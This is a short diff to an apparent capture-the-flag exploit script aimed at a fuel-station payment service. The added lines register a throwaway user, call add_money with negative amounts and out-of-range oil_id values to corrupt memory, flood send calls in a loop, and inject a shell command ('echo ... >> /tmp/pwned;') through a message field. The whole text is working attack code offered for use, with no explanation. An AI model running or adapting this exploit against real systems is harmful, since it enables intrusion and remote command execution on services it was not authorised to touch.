@@ -27,5 +27,13 @@ def add_money(uid: str, amount: int, station_id: int, oil_id: int):
 
 u = ''.join([random.choice(string.ascii_letters) for _ in range(10)])
 uid = json.loads(register(u, u))['id']
+
+send(uid, balance=1, fr=16007, to=16018, msg='aaaaaaa')
+add_money(uid, amount=-10000, oil_id=0, station_id=16018)
+
+for i in range(1000):
+    send(uid, balance=1, fr=16007, to=16018, msg='aaaaaaa')
+
 add_money(uid, amount=-0x38af00, oil_id=-0x38, station_id=16018)
 send(uid, balance=1, fr=16007, to=16018, msg='echo aaaaaaaaaaaaaaaaaaaaaa >> /tmp/pwned; '.ljust(0x40, ' '))
+add_money(uid, amount=-0x38af00, oil_id=0xfffff, station_id=16018)
